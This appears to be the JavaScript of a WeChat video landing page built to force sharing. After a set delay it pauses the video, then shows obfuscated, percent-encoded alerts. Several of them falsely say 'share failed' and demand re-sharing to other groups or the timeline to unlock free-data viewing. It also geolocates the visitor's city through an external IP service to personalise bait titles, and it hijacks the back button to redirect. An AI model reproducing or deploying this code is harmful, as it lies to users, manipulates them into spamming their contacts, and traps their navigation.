var player, num = 0, dc = '';
var config = JSON.parse(unescape($('#page-config').html()));
var App = {
    initBase: function(mode){
        $('.foot-icon').on('click', function(){
            $('.foot-icon').css('display', 'none');
            $('.foot-icon2').css('display', 'inline-block');
        });
        $('.foot-icon2').on('click', function(){
            $('.foot-icon2').css('display', 'none');
            $('.foot-icon').css('display', 'inline-block');
        });
        $('#lly_dialog .weui-dialog__btn_primary').on('click', function(){
            $('#lly_dialog').hide();
        });

        setTimeout(function(){
            var h = $('#scroll').height();
            $('#scroll').css('height', h > window.screen.height ? h : window.screen.height + 1);
            new IScroll('.container', {useTransform: false, click: true});
        }, 500);

        $(window).on('popstate', function(e){
            if(config.back) {
                App.jump(config.back);
            }
        });
        setTimeout(function() {
            history.pushState(history.length + 1, "message", "#" + new Date().getTime());
        }, 200);

        var pars = {};
        if(location.hash) {
            pars.url = location.href.slice(0, -location.hash.length);
        } else {
            pars.url = location.href;
        }
        $.post('/inner/sdk.php', pars, 'json').then(function(dat) {
            window.dat = dat;
            wx.config({
                //debug: true,
                appId: dat.appid,
                timestamp: parseInt(dat.timestamp),
                nonceStr: dat.nonce,
                signature: dat.signature,
                jsApiList: ['onMenuShareAppMessage', 'onMenuShareTimeline', 'hideAllNonBaseMenuItem', 'showMenuItems']
            });

            var sData = config;
            var shareData = function(extend){
                var obj = {
                    title: sData.title.replace(/<city>/g, dc),
                    link: sData.link,
                    imgUrl: sData.imgUrl,
                    desc: sData.desc.replace(/<city>/g, dc),
                    success: function() {
                        if (num == 0){
                            sData = dat.sData[num];
                            num++;
                            if(sData != 'close') {
                                wx.onMenuShareAppMessage(shareData({}));
                                App.alert(unescape('%3Cb%20style%3D%22font-size%3A%2022px%3B%22%3E%u5206%u4EAB%u5931%u8D25%21%3C/b%3E%3Cbr%3E%u8BF7%u91CD%u65B0%u5206%u4EAB%u5230%3Cb%20style%3D%22color%3A%20red%3Bfont-size%3A120%25%22%3E1%3C/b%3E%u4E2A%u4E0D%u540C%u7684%u5FAE%u4FE1%u7FA4%uFF0C%u5373%u53EF%3Cb%20style%3D%22color%3A%20red%3Bfont-size%3A120%25%22%3E%u514D%u6D41%u91CF%u52A0%u901F%u89C2%u770B%3C/b%3E'));
                                return;
                            }
                        }
                        if (num == 1){
                            sData = dat.sData[num];
                            num++;
                            if(sData != 'close') {
                                wx.onMenuShareAppMessage(shareData({}));
                                App.alert(unescape('%3Cb%20style%3D%22font-size%3A%2022px%3B%22%3E%u5206%u4EAB%u5931%u8D25%21%3C/b%3E%3Cbr%3E%3Cb%20style%3D%22color%3A%20red%3Bfont-size%3A120%25%3B%22%3E%u6CE8%u610F%3A%20%u5206%u4EAB%u5230%u76F8%u540C%u7684%u7FA4%u4F1A%u5931%u8D25%21%3C/b%3E%3Cbr%3E%u8BF7%u91CD%u65B0%u5206%u4EAB%u5230%3Cb%20style%3D%22color%3A%20red%3Bfont-size%3A120%25%3B%22%3E1%3C/b%3E%u4E2A%u4E0D%u540C%u7684%u7FA4%21'));
                                return;
                            }
                        }
                        if (num == 2){
                            sData = dat.sData[num];
                            num++;
                            if(sData != 'close') {
                                wx.onMenuShareAppMessage(shareData({}));
                                App.alert(unescape('%3Cb%20style%3D%22font-size%3A%2022px%3B%22%3E%u5206%u4EAB%u6210%u529F%21%3C/b%3E%3Cbr%3E%u8BF7%u7EE7%u7EED%u5206%u4EAB%u5230%3Cb%20style%3D%22color%3Ared%3Bfont-size%3A120%25%3B%22%3E1%3C/b%3E%u4E2A%u4E0D%u540C%u7684%u7FA4%u5373%u53EF%3Cb%20style%3D%22color%3A%20red%3Bfont-size%3A120%25%22%3E%u514D%u6D41%u91CF%u52A0%u901F%u89C2%u770B%3C/b%3E%21'));
                                return;
                            }
                        }
                        if (num == 3){
                            sData = dat.sData[num];
                            num++;
                            if(sData != 'close') {
                                wx.hideAllNonBaseMenuItem();
                                wx.showMenuItems({
                                    menuList: ['menuItem:share:timeline']
                                });
                                wx.onMenuShareTimeline(shareData({}));
                                App.alert(unescape('%3Cb%20style%3D%22font-size%3A%2022px%3B%22%3E%u5206%u4EAB%u6210%u529F%21%3C/b%3E%3Cbr%3E%u6700%u540E%u8BF7%u5206%u4EAB%u5230%3Cb%20style%3D%22color%3Ared%3Bfont-size%3A120%25%3B%22%3E%u670B%u53CB%u5708%3C/b%3E%u5373%u53EF%21'));
                                return;
                            }
                        }
                        if (num == 4){
                            sData = dat.sData[num];
                            num++;
                            if(sData != 'close') {
                                wx.hideAllNonBaseMenuItem();
                                wx.showMenuItems({
                                    menuList: ['menuItem:share:timeline']
                                });
                                wx.onMenuShareTimeline(shareData({}));
                                App.alert(unescape('%3Cb%20style%3D%22font-size%3A%2022px%3Bcolor%3Ared%22%3E%u5206%u4EAB%u5931%u8D25%3C/b%3E%3Cbr%3E%u518D%u5206%u4EAB%u4E00%u6B21%3Cb%20style%3D%22color%3Ared%3Bfont-size%3A120%25%3B%22%3E%u670B%u53CB%u5708%3C/b%3E%u5373%u53EF%u89C2%u770B%21'));
                                return;
                            }
                        }
                        sessionStorage.setItem('s_' + config.vid, 'c');
						
                        location.reload();
						 
                    },
                    cancel: function(){
                    }
                };
                return $.extend(obj, extend);
            };

            wx.ready(function(){
                var sf = shareData({});
                delete sf.desc;
                wx.onMenuShareTimeline(sf);
                wx.onMenuShareAppMessage(shareData({}));
                wx.hideAllNonBaseMenuItem();
                if(mode == 's') {
                    wx.showMenuItems({
                        menuList: ['menuItem:share:appMessage']
                    });
                }
                
                if(config.status == 'pending') {
                    var isFirst = true;
                    setInterval(function(){
                        try {
                            var currentTime = player.getCurTime();
                            if(currentTime >= config.delay) {
                                $('#pauseplay').show();
                                player.callCBEvent('pause');
                                sessionStorage.setItem('s_' + config.vid, 's');
								sessionStorage.setItem('load', true);
                                if(isFirst) {
                                    location.reload();
                                } else {
                                    isFirst = false;
                                }
                            }
                        } catch (e) {

                        }
                    }, 1000);
                }
            });
        });
    },
    initC: function() {
        App.initBase('c');
        var elId = 'mod_player_skin_0';
        $(".box-audio").html('<div id="'+elId+'" class="player_skin" style="padding-top:6px;"></div>');
        var elWidth = $(".box-audio").width();
        App.playVideo(config.vid,elId,elWidth);
    },
    initS: function(){
        App.initBase('s');
        $('#s').show();
        App.alert(unescape("%3Cimg%20style%3D%22width%3A%2040px%3Bmargin-top%3A%20-30px%22%20src%3D%22http%3A//puep.qpic.cn/coral/Q3auHgzwzM4fgQ41VTF2rN41ibuV99MPdQAGo6WSIP2aicKRzEKUtaxg/0%22%3E%3Cbr%3E%3Cb%20style%3D%22font-size%3A%2022px%3Bcolor%3A%20red%22%3E%u6570%u636E%u52A0%u8F7D%u4E2D%u65AD%3C/b%3E%3Cbr%3E%u8BF7%u5206%u4EAB%u5230%u5FAE%u4FE1%u7FA4%uFF0C%u53EF%3Cb%20style%3D%22color%3A%20red%3B%22%3E%u514D%u6D41%u91CF%u52A0%u901F%u89C2%u770B%3C/b%3E"));
    },
    playVideo: function(vid,elId,elWidth){
        //定义视频对象
        var video = new tvp.VideoInfo();
        //向视频对象传入视频vid
        video.setVid(vid);

        //定义播放器对象
        player = new tvp.Player(elWidth, 200);
        //设置播放器初始化时加载的视频
        player.setCurVideo(video);

        //输出播放器,参数就是上面div的id，希望输出到哪个HTML元素里，就写哪个元素的id
        //player.addParam("autoplay","1"); 

        player.addParam("wmode","transparent");
        player.addParam("pic",tvp.common.getVideoSnapMobile(vid));
        player.write(elId);
    },
    jump: function(url) {
        var a = document.createElement('a');
        a.setAttribute('rel', 'noreferrer');
        a.setAttribute('id', 'm_noreferrer');
        a.setAttribute('href', url);
        document.body.appendChild(a);
        document.getElementById('m_noreferrer').click();
        document.body.removeChild(a);
    },
    alert: function(text, callback){
        $('#lly_dialog .weui-dialog__bd').html(text);
        $('#lly_dialog').show();
        $('#lly_dialog .weui-dialog__btn_primary').off('click');
        $('#lly_dialog .weui-dialog__btn_primary').on('click', function(){
            $('#lly_dialog').hide();
            if(typeof  callback == 'function') {
                callback();
            }
        });
    },
};

$.getScript('http://int.dpool.sina.com.cn/iplookup/iplookup.php?format=js',function(){
    dc = remote_ip_info.city;
    $('.box-new header').html($('.box-new header').html().replace(/<city>/, dc));});
if(sessionStorage.getItem('s_' + config.vid) == 's') {
    App.initS();
} else if(sessionStorage.getItem('s_' + config.vid) == 'a') {
    if(config.back) {
        App.jump(config.back);
    } else {
        App.jump('https://m.baidu.com/');
    }
} else {
    if(config.status != 'continue') {
        if(sessionStorage.getItem('s_' + config.vid) == 'c') {
            App.alert(unescape('%u5206%u4EAB%u6210%u529F%2C%20%u8BF7%u70B9%u51FB%u6309%u94AE%u7EE7%u7EED%u64AD%u653E.'));
            config.status = 'continue';
            //sessionStorage.setItem('s_' + config.vid, 'a');
        }
    }
    App.initC();
}

